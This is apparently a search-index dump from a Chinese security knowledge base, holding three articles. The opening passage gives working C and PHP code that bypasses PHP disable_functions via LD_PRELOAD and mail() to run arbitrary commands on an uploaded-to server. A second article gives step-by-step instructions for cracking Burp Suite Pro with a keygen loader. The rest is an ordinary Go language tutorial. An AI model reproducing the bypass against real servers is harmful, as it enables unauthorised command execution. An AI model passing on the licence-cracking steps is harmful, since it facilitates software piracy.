就又被劫持，导致无限循环。所以，我得找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 extern char** environ！实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。 C(so) 这个修饰符attribute ((constructor)) 只要启动进程便会进行劫持 #define _GNU_SOURCE #include #include #include extern char** environ; __attribute__ ((__constructor__)) void preload (void) { // get command line options and arg const char* cmdline = getenv(\"EVIL_CMDLINE\"); // unset environment variable LD_PRELOAD. // unsetenv(\"LD_PRELOAD\") no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], \"LD_PRELOAD\")) { environ[i][0] = '\\0'; } } // executive command system(cmdline); } php \" . $out_path . \" 2>&1\"; echo \" cmdline: \" . $evil_cmdline . \"\"; putenv(\"EVIL_CMDLINE=\" . $evil_cmdline); $so_path = $_GET[\"sopath\"]; putenv(\"LD_PRELOAD=\" . $so_path); mail(\"\", \"\", \"\", \"\"); echo \" output: \" . nl2br(file_get_contents($out_path)) . \"\"; unlink($out_path); ?> gcc -fPIC -shared hack.c -o hack.so 分别将动态库hack.so文件，php脚本hack.php上传到服务器中，再访问hack.php脚本文件，并带上参数cmd(待执行的命令)，outpath(结果重定向文件位置),sopath(加载动态链接库的位置) 参考链接 https://www.anquanke.com/post/id/254388#h2-4 https://www.freebuf.com/articles/web/192052.html https://blog.csdn.net/weixin_45146120/article/details/104909730 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-13 15:00:50 "},"知识库/03.主机安全/23.Ubuntu安装burp.html":{"url":"知识库/03.主机安全/23.Ubuntu安装burp.html","title":"23.Ubuntu安装burp","keywords":"","body":"Ubuntu2020.2桌面版 安装 BurpSuite2020.2 因为工作需要，现在将操作系统换成了Ubuntu 2020.2 Desktop，需要将以前的工具安装到现在的操作系统 安装jdk jdk需要使用oracle jdk，不能使用openjdk，open jdk支持性没有oracle jdk高 java -version openjdk version \"1.8.0_102\" OpenJDK Runtime Environment (build 1.8.0_102-b14) OpenJDK 64-Bit Server VM (build 25.102-b14, mixed mode)xxxxxxxxxx openjdk version \"1.8.0_102\" OpenJDK Runtime Environment (build 1.8.0_102-b14) OpenJDK 64-Bit Server VM (build 25.102-b14, mixed mode)java version \"1.8.0_261\"Java(TM) SE Runtime Environment (build 1.8.0_261-b12)Java HotSpot(TM) 64-Bit Server VM (build 25.261-b12, mixed mode)bash 如果是openjdk需要卸载openjdk sudo apt-get remove openjdk* 确认卸载完毕之，去oracle官网下载oracle jdk,现在下载jdk需要注册，下载好之后，在/usr目录下创建一个java目录，再将jdk.tar.gz放在/usr/java目录下，并解压.tar.gz，具体操作如下： sudo mkdir /usr/java sudo mv /home/user/Download/jdk.tar.gz /usr/java cd /usr/java tar zxvf jdk.tar.gz sudo rm jdk.tar.gz -f 在/etc/profile最后一行如下添加环境变量 export JAVA_HOME=/usr/java/jdk1.8.0_261 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH 添加完成之后，执行soucre /etc/profile命令，如果在新打开终端之后，能够访问到$JAVA_HOME，需要在/etc/bash.bashrc中添加环境变量，桌面版推荐编辑/etc/bash.bashrc，编辑完之后，关闭该终端，新打开一个终端，环境变量生效 [!NOTE] 还是推荐使用oracle JDK，open JDK 不太好用个人认为 破解burp 在burpsuite的文件夹中打开终端，使用sudo java -jar burp-loader-keygen.jar，这个时候执行sudo java会报command not found的错误，网上很多文章是说将jdk的路径添加到security path,其实这个时候更好的做法是将java软链接到/usr/bin/目录下，顺便也将javac软链接到/usr/bin中 [!NOTE] 其实这里最好的做法是不用sudo，直接以jdk的绝对路径启动就行，2020年那会儿对LInux了解不深，只是觉得需要以root来启动比较安全哈哈哈 [!TIP] 这会儿的做法大多数是将其写成一个桌面应用直接点击即可 不过使用后台任务也不错，这样不用去寻找桌面应用直接在终端点击即可 [!WARNING] 使用终端打开一定得切记环境变量，主要是多用户或者root用户无java环境的问题，以及java权限，执行终端burp的权限的问题 不要再软链接到/usr/bin 目录下 sudo ln -s /usr/java/jdk/bin/java /usr/bin/ sudo ln -s /usr/java/jdk/bin/javac /usr/bin/ 当完成以上操作，则可以使用sudo java的命令 在普通用户的terminal下，进入burp的文件夹，其中burp的文件目录结构如下图所示： 输入命令 sudo java -jar burp-loader-keygen.jar 其中License Text可以修改为License to ，只有这样才能点击run按钮启动burpsuite_pro_v2020.2.jar 启动之后，将License中的内容粘贴到Enter license key中，点击next，这里选择Manual activation 在Manual activation窗口中 点击Copy request 复制内容到Activation Request中，最后再复制Activation Response中的激活码内容到Manual activation中的Paste Response点击next 然后添加快捷方式，首先我们要知道linux下的快捷方式启动需要看$PATH，系统的快捷可执行文件都需要软链接到/usr/bin目录下 所以在/usr/bin/目录下创建burpsuite文件 cd /usr/bin/ && sudo touch burpsuite sudo vim burpsuite #按如下方式编辑 sudo java -noverify -Xbootclasspath/p://burp-loader-keygen.jar -jar /burpsuite_pro_v2020.2.jar #编辑完成之后wq保存，再添加一个x权限 sudo chmod +x burpsuite 最后在terminal中输入命令burpsuite就可以启动burp了 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2024-02-20 14:33:54 "},"知识库/04.编程开发/01.GO/01.GO基础/":{"url":"知识库/04.编程开发/01.GO/01.GO基础/","title":"01.GO基础","keywords":"","body":"介绍 Go语言(Golang)最初是由Robert Griesemer, Rob Pike, 和 Ken Thompson在谷歌于2007年开发出来的编程语言。Go编程语言是静态类型语言，语法类似于C语言，它提供了垃圾收集，类型安全，动态的输入能力，还有很多先进的内置类型，例如，可变长度数组和映射（键-值对）。它还提供了丰富的标准库。 Go编程语言是在2009年11月正式对外发布，主要是应用谷歌的于一些生产系统链中。 Hello World package main import \"fmt\" func main() { fmt.Println(\"HELLO WORLD\") } go run Hello.go GO语言基础 工作空间 go工具为公共代码仓库中维护的开源代码而设计。 无论会不会公布代码，该模型设置工作环境的方法都是相同的。 Go代码必须放在工作空间内。它其实就是一个目录，其中包含三个子目录： src 目录包含Go的源文件，它们被组织成包（每个目录都对应一个包） pkg 目录包含包对象 bin 目录包含可执行命令 go 工具用于构建src目录中的源码包，并将其生成的二进制文件安装到 pkg 和 bin 目录中。 src 子目录通常包会含多种版本控制的代码仓库（例如Git或Mercurial）， 以此来跟踪一个或多个源码包的开发。 结构举例如下： bin/ hello # 可执行命令 pkg/ linux_amd64/ # 这里会反映出你的操作系统和架构 github.com/user/ stringutil.a # 包对象 src/ github.com/user/ hello/ hello.go # 命令源码 stringutil/ reverse.go # 包源码 环境变量 go env 而 GOPATH 环境变量指定了你的工作空间位置，这也是很重要的一个变量。 首先创建一个工作空间目录，并设置相应的 GOPATH，工作空间可以放在任何地方，我们使用 $HOME/go。 注意，它绝对不能和你的Go安装目录相同。（另一种常见的设置是 GOPATH=$HOME。) 设置GOPATH export GOPATH=$HOME/go 然后将bin添加到环境变量中 export PATH=$PATH:$GOPATH/bin 包路径 标准库中的包有给定的短路径，比如 \"fmt\" 和 \"net/http\"。 对于你自己的包，你必须选择一个基本路径，来保证它不会与将来添加到标准库， 或其它扩展库中的包相冲突。 如果你将你的代码放到了某处的源码库，那就应当使用该源码库的根目录作为你的基本路径。 例如，若你在 GitHub 上有账户 github.com/user 那么它就应该是你的基本路径。 我们将使用 github.com/user 作为基本路径。在你的工作空间里创建一个目录， 我们将源码存放到其中： mkdir -p $GOPATH/src/github.com/user 包名 源文件中的第一个语句必须是 package 名称 这里的 **名称** 即为导入该包时使用的默认名称。 （一个包中的所有文件都必须使用相同的 **名称**。） Go的约定是包名为导入路径的最后一个元素：作为 “crypto/rot13” 导入的包应命名为 rot13。 可执行命令必须使用 package main。 链接成单个二进制文件的所有包，其包名无需是唯一的，只有导入路径（它们的完整文件名） 才是唯一的。 包文档 1、使用命令go doc go doc fmt.Println 2、另一种比较常用的方式，是直接进去包内查看源码 代码结构 Go 语言的基础组成有以下几个部分： 包声明 引入包 函数 变量 语句 & 表达式 注释 以上面的hello world代码为例 package main // 定义了包名。必须在源文件中非注释的第一行指明这个文件属于哪个包，如：package main。package main表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 main 的包。 import \"fmt\" // 引用fmt包（的函数，或其他元素），fmt 包实现了格式化 IO（输入/输出）的函数 func main() { // 程序开始执行的函数。main 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数） fmt.Println(\"HELLO WORLD\") // 调用fmt包中的函数，将字符串输出到控制台，并在最后自动增加换行字符 \\n } 其他： //开头的为单行注释，/*开头，并以*/结尾为多行注释 当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 protected ） 函数名首字母小写即为 protected :func getId() {} 函数名首字母大写即为 public : func Printf() {} 代码编译运行 创建目录/Users/d4m1ts/go/src/github.com/damit5/goTest，并编写代码Hello.go，代码如上 快速运行 编写完成代码后，有两种方法可以快速运行 一种是直接动态运行 go run xxx.go 另一种则是先编译成二进制文件再手动执行 go build xxx.go 安装到本地 还有一种方法可以安装到本地，简单来说就是生成二进制文件并且放到bin目录下，如果在项目目录中就直接go install即可，在其他路径则需要带上src后的路径 go install go install github.com/damit5/goTest 无论是安装包还是二进制文件，go 工具都会安装它所依赖的任何东西 如果提示go: go.mod file not found in current directory or any parent directory; see 'go help modules'，说明需要初始化项目，执行 go mod init {项目名} 然后就可以用go install了，生成后的二进制文件自动存放在bin目录中 远程下载并编译 前提是提前上传到github中 若指定的包不在工作空间中，go get就会将会将它放到 GOPATH 指定的第一个工作空间内。（若该包已存在，go get 就会跳过远程获取， 其行为与 go install 相同） go get github.com/damit5/goTest go get -v github.com/damit5/goTest 交叉编译 CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_darwin CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_linux CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_win.exe 代码测试 Go拥有一个轻量级的测试框架，它由 go test 命令和 testing 包构成。 你可以通过创建一个名字以 _test.go 结尾的，包含名为 TestXXX 且签名为 func (t *testing.T) 函数的文件来编写测试。 测试框架会运行每一个这样的函数；若该函数调用了像 t.Error 或 t.Fail 这样表示失败的函数，此测试即表示失败。 实例： package main import ( \"fmt\" \"testing\" ) func sum(a int, b int) int { return a+b } func TestSum(t *testing.T) { a := 10 b := 20 c := sum(a, b) if c == a+b { fmt.Println(\"success\") } else { t.Errorf(\"error happends\") } } 代码编写后，使用如下命令即可测试 go test go test github.com/damit5/goTest GO标记 Go 程序可以由多个标记组成，可以是关键字，标识符，常量，字符串，符号。如以下 GO 语句由 6 个标记组成： fmt.Println(\"Hello, World!\") 6 个标记是(每行一个)： fmt . Println ( \"Hello, World!\" ) 标识符 标识符用来命名变量、类型等程序实体。一个标识符实际上就是一个或是多个字母( A ~ Z 和 a ~ z)数字(0~9)、下划线_组成的序列，但是第一个字符必须是字母或下划线而不能是数字。 关键字 下面列举了 Go 代码中会使用到的 25 个关键字或保留字： break default func interface select case defer go map struct chan else goto package switch const fallthrough if range type continue for import return var 除了以上介绍的这些关键字，Go 语言还有 36 个预定义标识符： append bool byte cap close complex complex64 complex128 uint16 copy false float32 float64 imag int int8 int16 uint32 int32 int64 iota len make new nil panic uint64 print println real recover string true uint uint8 uintptr 行分隔符; 在Go程序中，一行代表一个语句结束。每个语句不需要像 C 家族中的其它语言一样以分号 ; 结尾，因为这些工作都将由 Go 编译器自动完成。 如果你打算将多个语句写在同一行，它们则必须使用 ; 人为区分，但在实际开发中我们并不鼓励这种做法。 注释 注释不会被编译，每一个包应该有相关注释。 // 单行注释 /* 多行注释 */ 字符串连接 和大多数语言一样，连接通过+来实现 fmt.Println(\"HELLO WORLD\\t\" + \"d4m1ts\") 格式化字符串 Go 语言中使用 fmt.Sprintf 格式化字符串并赋值给新串 package main import \"fmt\" func main() { var keyword = \"world\" var name = \"d4m1ts\" var age = 18 var template = \"hello %s %s %d\" var sentence = fmt.Sprintf(template, keyword, name, age) fmt.Println(sentence) } // hello world d4m1ts 18 数据类型 序号 类型和描述 1 布尔型布尔型的值只可以是常量 true 或者 false。一个简单的例子：var b bool = true 。 | | 2 | 数字类型整型 int 和浮点型 float32、float64，Go 语言支持整型和浮点型数字，并且支持复数，其中位的运算采用补码。 | | 3 | 字符串类型:字符串就是一串固定长度的字符连接起来的字符序列。Go 的字符串是由单个字节连接起来的。Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。 | | 4 | 派生类型:包括： (a) 指针类型（Pointer） (b) 数组类型 (c) 结构化类型(struct) (d) Channel 类型 (e) 函数类型 (f) 切片类型 (g) 接口类型（interface） (h) Map 类型 | 数字类型 Go 也有基于架构的类型，例如：int、uint 和 uintptr。 序号 类型和描述 1 uint8 无符号 8 位整型 (0 到 255) 2 uint16 无符号 16 位整型 (0 到 65535) 3 uint32 无符号 32 位整型 (0 到 4294967295) 4 uint64 无符号 64 位整型 (0 到 18446744073709551615) 5 int8 有符号 8 位整型 (-128 到 127) 6 int16 有符号 16 位整型 (-32768 到 32767) 7 int32 有符号 32 位整型 (-2147483648 到 2147483647) 8 int64 有符号 64 位整型 (-9223372036854775808 到 9223372036854775807) 浮点型 序号 类型和描述 1 float32 IEEE-754 32位浮点型数 2 float64 IEEE-754 64位浮点型数 3 complex64 32 位实数和虚数 4 complex128 64 位实数和虚数 其他数字类型 以下列出了其他更多的数字类型： 序号 类型和描述 1 byte 类似 uint8 2 rune 类似 int32 3 uint 32 或 64 位 4 int 与 uint 一样大小 5 uintptr 无符号整型，用于存放一个指针 值类型和引用类型 值类型是单独记录在内存中的，每2个数据都是独立的，其中一个修改不会影响到另一个 引用类型记录的是指针地址，如果2个数据指向同一个地址，那么其中一个被修改了，另一个也会被修改 所有像 int、float、bool 和 string 这些基本类型都属于值类型，使用这些类型的变量直接指向存在内存中的值 当使用等号 = 将一个变量的值赋值给另一个变量时，如：j = i，实际上是在内存中将 i 的值进行了拷贝，可以通过 &i 来获取变量 i 的内存地址 而更复杂的数据通常会需要使用多个字，这些数据一般使用引用类型保存。 一个引用类型的变量 r1 存储的是 r1 的值所在的内存地址（数字），或内存地址中第一个字所在的位置 这个内存地址称之为指针，这个指针实际上也被存在另外的某一个值中。 同一个引用类型的指针指向的多个字可以是在连续的内存地址中（内存布局是连续的），这也是计算效率最高的一种存储形式；也可以将这些字分散存放在内存中，每个字都指示了下一个字所在的内存地址。 当使用赋值语句 r2 = r1 时，只有引用（地址)被复制。 如果 r1 的值被改变了，那么这个值的所有引用都会指向被修改后的内容，在这个例子中，r2 也会受到影响。 GO开发基础 声明变量 变量名由字母、数字、下划线组成，其中首个字符不能为数字。 声明变量的一般形式是使用 var 关键字： 语法： // 标准语法 var identifier type // 也可以同时声明多个变量 var identifier1, identifier2 type // 1. 指定变量类型，如果没有初始化，则变量默认为零值（没有做初始化时系统默认设置的值） var a int // 0 var b bool // false var c string // \"\" var a []int // nil // 2. 没有指定变量类型，则根据值自行判定变量类型 var d = true // 自动识别为bool // 3. 使用 := 可以快速声明变量 /* := 等价于 var name string; name = \"d4m1ts\" 这种格式只能在函数体中出现 */ name := \"d4m1ts\" // 4. 如果变量已经使用 var 声明过了，再使用 := 声明变量，就产生编译错误 var name = \"d4m1ts\" name := \"d4m1ts\" 单变量声明实例： var a,b int8 a = 1 b = 2 var name = \"d4m1ts\" name1 := \"d4m1ts\" 多变量声明实例： var a,b int = 1,2 c,d := 3,4 任意变量： 如果想接受任意类型的变量，可以用interface 比如var jsonData []map[string]interface{} package main import ( \"fmt\" ) func init() { fmt.Print(\"init\") } func main() { test1(\"123\") test1(1) test2(\"123\",1, \"324\", 12) } // 实现传单个任何类型的参数 func test1(v interface{}) { fmt.Println(v) // 打印 “123” 1 } // 实现传任意多个任意类型的参数 func test2(v ...interface{}) { for _, m := range v { fmt.Println(m) // 依次打印 123 1 324 12 } } interface{}转string var a interface{} a.(string) 声明常量 常量是一个简单值的标识符，在程序运行时，不会被修改的量，一般形式是使用 const 关键字。 常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。 语法： 和变量一样，type可以省略 显式类型定义： const b string = \"abc\" 隐式类型定义： const b = \"abc\"const identifier [type] = value 定义实例：const j = 4 const i,j = 3,4 用作枚举：package main import ( \"fmt\" \"unsafe\" ) func main() { const ( a = \"abc\" b = len(a) c = unsafe.Sizeof(b) ) fmt.Println(c) } // 8 iota： 特殊常量，可以认为是一个可以被编译器修改的常量 iota 在 const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。package main import \"fmt\" func main() { const ( a = iota //0 b //1 c //2 d = \"ha\" //独立值，iota += 1 e //\"ha\" iota += 1 f = 100 //iota +=1 g //100 iota +=1 h = iota //7,恢复计数 i //8 ) fmt.Println(a,b,c,d,e,f,g,h,i) } // 0 1 2 ha ha 100 100 7 8 运算符 算术运算符 下表列出了所有Go语言的算术运算符。假定 A 值为 10，B 值为 20。 运算符 描述 实例 + 相加 A + B 输出结果 30 - 相减 A - B 输出结果 -10 * 相乘 A * B 输出结果 200 / 相除 B / A 输出结果 2 % 求余 B % A 输出结果 0 ++ 自增 A++ 输出结果 11 -- 自减 A-- 输出结果 9 关系运算符 下表列出了所有Go语言的关系运算符。假定 A 值为 10，B 值为 20。 运算符 描述 实例 == 检查两个值是否相等，如果相等返回 True 否则返回 False。 (A == B) 为 False != 检查两个值是否不相等，如果不相等返回 True 否则返回 False。 (A != B) 为 True > 检查左边值是否大于右边值，如果是返回 True 否则返回 False。 (A > B) 为 False 检查左边值是否小于右边值，如果是返回 True 否则返回 False。 (A >= 检查左边值是否大于等于右边值，如果是返回 True 否则返回 False。 (A >= B) 为 False 检查左边值是否小于等于右边值，如果是返回 True 否则返回 False。 (A 逻辑运算符 下表列出了所有Go语言的逻辑运算符。假定 A 值为 True，B 值为 False。 运算符 描述 实例 && 逻辑 AND 运算符。 如果两边的操作数都是 True，则条件 True，否则为 False。 (A && B) 为 False || 逻辑 OR 运算符。 如果两边的操作数有一个 True，则条件 True，否则为 False。 (A || B) 为 True ! 逻辑 NOT 运算符。 如果条件为 True，则逻辑 NOT 条件 False，否则为 True。 !(A && B) 为 True 位运算符 位运算符对整数在内存中的二进制位进行操作。 下表列出了位运算符 &, |, 和 ^ 的计算： p q p & q p | q p ^ q 0 0 0 0 0 0 1 0 1 1 1 1 1 1 0 1 0 0 1 1 Go 语言支持的位运算符如下表所示。假定 A 为60，B 为13： 运算符 描述 实例 & 按位与运算符\"&\"是双目运算符。 其功能是参与运算的两数各对应的二进位相与。 (A & B) 结果为 12, 二进制为 0000 1100 | 按位或运算符\"|\"是双目运算符。 其功能是参与运算的两数各对应的二进位相或 (A | B) 结果为 61, 二进制为 0011 1101 ^ 按位异或运算符\"^\"是双目运算符。 其功能是参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1。 (A ^ B) 结果为 49, 二进制为 0011 0001 左移运算符\" A >> 右移运算符\">>\"是双目运算符。右移n位就是除以2的n次方。 其功能是把\">>\"左边的运算数的各二进位全部右移若干位，\">>\"右边的数指定移动的位数。 A >> 2 结果为 15 ，二进制为 0000 1111 赋值运算符 下表列出了所有Go语言的赋值运算符。 运算符 描述 实例 = 简单的赋值运算符，将一个表达式的值赋给一个左值 C = A + B 将 A + B 表达式结果赋值给 C += 相加后再赋值 C += A 等于 C = C + A -= 相减后再赋值 C -= A 等于 C = C - A *= 相乘后再赋值 C = A 等于 C = C A /= 相除后再赋值 C /= A 等于 C = C / A %= 求余后再赋值 C %= A 等于 C = C % A 左移后赋值 C >>= 右移后赋值 C >>= 2 等于 C = C >> 2 &= 按位与后赋值 C &= 2 等于 C = C & 2 ^= 按位异或后赋值 C ^= 2 等于 C = C ^ 2 |= 按位或后赋值 C |= 2 等于 C = C | 2 其他运算符 下表列出了Go语言的其他运算符。 运算符 描述 实例 & 返回变量存储地址 &a; 将给出变量的实际地址。 * 指针变量。 *a; 是一个指针变量 运算符优先级 有些运算符拥有较高的优先级，二元运算符的运算方向均是从左至右。下表列出了所有运算符以及它们的优先级，由上至下代表优先级由高到低： 优先级 运算符 5 * / % > & &^ 4 + - | ^ 3 == != >= 2 && 1 || 空白标识符 用 _ 可以代表被丢弃的值，避免一些变量因为没使用导致程序报错 实例： 变量j必须使用，否则会报错 package main import \"fmt\" func main() { a := [] int {1,2,3,4,5} for j,i := range a { fmt.Println(j, i) } } 使用_来丢弃上面的j变量 package main import \"fmt\" func main() { a := [] int {1,2,3,4,5} for _,i := range a { fmt.Println(i) } } 格式化输出 Go采用的格式化打印风格和C的 printf 族类似，但却更加丰富而通用。 这些函数位于 fmt 包中，且函数名首字母均为大写：如 fmt.Printf、fmt.Fprintf，fmt.Sprintf 等。 字符串函数（Sprintf 等）会返回一个字符串，而非填充给定的缓冲区。 常见格式 var t interface{} t = functionOfSomeType() switch t := t.(type) { default: fmt.Printf(\"unexpected type %T\", t) // %T 输出 t 是什么类型 case bool: fmt.Printf(\"boolean %t\\n\", t) // t 是 bool 类型 case int: fmt.Printf(\"integer %d\\n\", t) // t 是 int 类型 case *bool: fmt.Printf(\"pointer to boolean %t\\n\", *t) // t 是 *bool 类型 case *int: fmt.Printf(\"pointer to integer %d\\n\", *t) // t 是 *int 类型 } 通用格式 package main import ( \"fmt\" ) type structTest struct { name string age int } func main() { a := structTest{ name: \"d4m1ts\", age: 18, } fmt.Printf(\"123 %v 456\\n\", \"aa\") // 123 aa 456 fmt.Printf(\"123 %v 456\\n\", a) // 123 {d4m1ts 18} 456 fmt.Printf(\"123 %+v 456\\n\", a) // 123 {name:d4m1ts age:18} 456 fmt.Printf(\"123 %#v 456\\n\", a) // 123 main.structTest{name:\"d4m1ts\", age:18} 456 } // 通用的格式 %v（对应“值”），这种格式还能打印任意值，甚至包括数组、结构体和映射。 // 当打印结构体时，改进的格式 %+v 会为结构体的每个字段添上字段名，而另一种格式 %#v 将完全按照Go的语法打印值。 条件语句 注意大括号{的位置，不能单独一行！！！ if package main import ( \"fmt\" ) func main() { name := \"d4m1ts\" if (len(name) > 5){ fmt.Println(name) } } if...else package main import ( \"fmt\" ) func main() { name := \"d4m1ts\" if (len(name) > 10){ fmt.Println(name) } else { fmt.Println(\"NONONO\") } } if...else if...else package main import ( \"fmt\" ) func main() { name := \"d4m1ts\" if (len(name) > 10){ fmt.Println(name) } else if (len(name) == 6) { fmt.Println(name, \"==6\") } else { fmt.Println(\"NONONO\") } } switch package main import \"fmt\" func main() { name := \"d4m1ts\" switch { case len(name) > 5: fmt.Print(\">5\") case len(name) select select 是 Go 中的一个控制结构，类似于用于通信的 switch 语句。每个 case 必须是一个通信操作，要么是发送要么是接收。 select 随机执行一个可运行的 case。如果没有 case 可运行，它将阻塞，直到有 case 可运行。一个默认的子句应该总是可运行的。 语法: Go 编程语言中 select 语句的语法如下： select { case communication clause : statement(s); case communication clause : statement(s); /* 你可以定义任意数量的 case */ default : /* 可选 */ statement(s); } 以下描述了 select 语句的语法： 每个 case 都必须是一个通信 所有 channel 表达式都会被求值 所有被发送的表达式都会被求值 如果任意某个通信可以进行，它就执行，其他被忽略。 如果有多个 case 都可以运行，Select 会随机公平地选出一个执行。其他不会执行。否则： 如果有 default 子句，则执行该语句。 如果没有 default 子句，select 将阻塞，直到某个通信可以运行；Go 不会重新对 channel 或值进行求值。 实例： package main import \"fmt\" func main() { var c1, c2, c3 chan int var i1, i2 int select { case i1 = 循环语句 for 语法： 共有3种语法，分别是 // 1.和 C 语言的 for 一样 for init; condition; post { } // 2.和 C 的 while 一样 for condition { } // 3.while true，需要手动break for { } init： 一般为赋值表达式，给控制变量赋初值； condition： 关系表达式或逻辑表达式，循环控制条件； post： 一般为赋值表达式，给控制变量增量或减量。 实例： package main import \"fmt\" func main() { sum := 0 // 1 ==> 10 for i:=0; i 40 for sum 160 for { sum += sum if sum > 100{ break } } fmt.Println(sum) } for each 严格来说是 for each range 循环 package main import \"fmt\" func main() { ab := []string {\"aaa\", \"bbb\"} for i,s := range ab{ fmt.Println(i ,s) } } /* 0 aaa 1 bbb */ 无限循环 package main import \"fmt\" func main() { for true { fmt.Println(\"1\") } } 循环控制 就是让循环停止或者跳过此次循环 break 经常用于中断当前 for 循环或跳出 switch 语句 continue 跳过当前循环的剩余语句，然后继续进行下一轮循环。 goto 将控制转移到被标记的语句。 goto见比较少，举个例子吧 package main import \"fmt\" func main() { a := 10 LOOP: for a init函数 每个源文件都可以通过定义自己的无参数 init 函数来设置一些必要的状态。（其实每个文件都可以拥有多个 init 函数。）而它的结束就意味着初始化结束：只有该包中的所有变量声明都通过它们的初始化器求值后 init 才会被调用， 而那些init 只有在所有已导入的包都被初始化后才会被求值。 除了那些不能被表示成声明的初始化外，init 函数还常被用在程序真正开始执行前，检验或校正程序的状态。 package main import \"fmt\" func init() { fmt.Println(\"init ...\") } func main() { fmt.Println(\"main ...\") } /* init ... main ... */ 自定义函数 语法： func function_name( [parameter list] ) [return_types] { 函数体 } 函数定义解析： func：函数由 func 开始声明 function_name：函数名称，参数列表和返回值类型构成了函数签名。 parameter list：参数列表，参数就像一个占位符，当函数被调用时，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的，也就是说函数也可以不包含参数。 return_types：返回类型，函数返回一列值。return_types 是该列值的数据类型。有些功能不需要返回值，这种情况下 return_types 不是必须的。 函数体：函数定义的代码集合。 实例： 选出2个数中最大的 package main import \"fmt\" func main() { fmt.Println(max(5,9 )) } func max (a int, b int) int { if a > b { return a } else { return b } } 返回多个值 package main import \"fmt\" func main() { fmt.Println(max(5,9 )) } func max (a int, b int) (int,int) { if a > b { return a,b } else { return b,a } } 引用传递值 传入的是地址，函数内值被修改，函数外也会受影响 package main import \"fmt\" func main() { a := 66 test(&a) fmt.Println(a) } func test(a *int) { fmt.Println(*a) *a += 10 fmt.Println(*a) } /* 66 76 76 */ 构造函数与复合字面 有时零值还不够好，这时就需要一个初始化构造函数，如来自 os 包中的这段代码所示。 func NewFile(fd int, name string) *File { if fd 这里显得代码过于冗长。我们可通过复合字面来简化它， 该表达式在每次求值时都会创建新的实例 func NewFile(fd int, name string) *File { if fd 作用域 局部变量 在函数体内声明的变量称之为局部变量，它们的作用域只在函数体内，参数和返回值变量也是局部变量。 全局变量 在函数体外声明的变量称之为全局变量，全局变量可以在整个包甚至外部包（被导出后）使用； 全局变量可以在任何函数中使用 全局变量与局部变量名称可以相同，但是函数内的局部变量会被优先考虑 实例： package main import \"fmt\" var global string = \"全局变量\" func main() { fmt.Println(global) } 数组 初始化数组 如果数组长度不确定，可以使用 ... 代替数组的长度，编译器会根据元素个数自行推断数组的长度（也可以使用切片） 初始化数组中 {} 中的元素个数不能大于 [] 中的数字 语法： var variable_name [SIZE] variable_type var balance [10] float32 实例： package main import \"fmt\" func main() { var a [10] string var b = [...] int {1,2,3,4,5} c := [] string {\"aa\", \"bb\", \"cc\"} // 切片 fmt.Println(a) fmt.Println(b) fmt.Println(c) } 访问数组 数组元素可以通过索引（位置）来读取。格式为数组名后加中括号，中括号中为索引的值。 package main import \"fmt\" func main() { c := [] string {\"aa\", \"bb\", \"cc\"} fmt.Println(c[0]) for i,s := range c { fmt.Println(i, s) } } 指针 使用指针 会C的指针，这个就很简单了 取地址符是&，放到一个变量前使用就会返回相应变量的内存地址 取值符是*，放到一个内存地址前使用就会返回相应变量的值 package main import \"fmt\" func main() { a := 1 // 实际变量 var ip *int // 指针变量 ip = &a fmt.Println(\"a的值：\", a) fmt.Println(\"a的地址：\", &a) fmt.Printf(\"a的地址：%x\", ip) } 空指针 当一个指针被定义后没有分配到任何变量时，它的值为 nil。 nil 指针也称为空指针。 nil在概念上和其它语言的null、None、nil、NULL一样，都指代零值或空值。 一个指针变量通常缩写为 ptr package main import \"fmt\" func main() { var ptr *int // 指针变量 fmt.Printf(\"ptr空指针地址：%x\", ptr) } // 0 判断空指针 if(ptr != nil) /* ptr 不是空指针 */ if(ptr == nil) /* ptr 是空指针 */ 指针数组 有一种情况，我们可能需要保存数组，这样我们就需要使用到指针 package main import \"fmt\" func main() { var a = [] int {1,2,3} var ptr [3] *int for i,s := range a { ptr[i] = &s } fmt.Println(ptr) // [0xc000198000 0xc000198000 0xc000198000] for i,s := range ptr { fmt.Println(i, *s) } } ptr 为整型指针数组，因此每个元素都指向了数组中第一个值的地址 结构体 定义结构体 结构体定义需要使用 type 和 struct 语句。struct 语句定义一个新的数据类型，结构体中有一个或多个成员。type 语句设定了结构体的名称。结构体的格式如下： type struct_variable_type struct { member definition member definition ... member definition } 一旦定义了结构体类型，它就能用于变量的声明，语法格式如下： variable_name := structure_variable_type {value1, value2...valuen} // 或 variable_name := structure_variable_type { key1: value1, key2: value2..., keyn: valuen} 实例： package main import \"fmt\" func main() { type testStruct struct { name string age int } a := testStruct{\"d4m1\", 18} fmt.Println(a) b := testStruct{name: \"d4m1ts\", age: 18} fmt.Println(b) } /* {d4m1 18} {d4m1ts 18} */ 访问成员 如果要访问结构体成员，需要使用点号.操作符，格式为： 结构体.成员名 实例： package main import \"fmt\" func main() { type testStruct struct { name string age int } a := testStruct{name: \"d4m1ts\", age: 18} 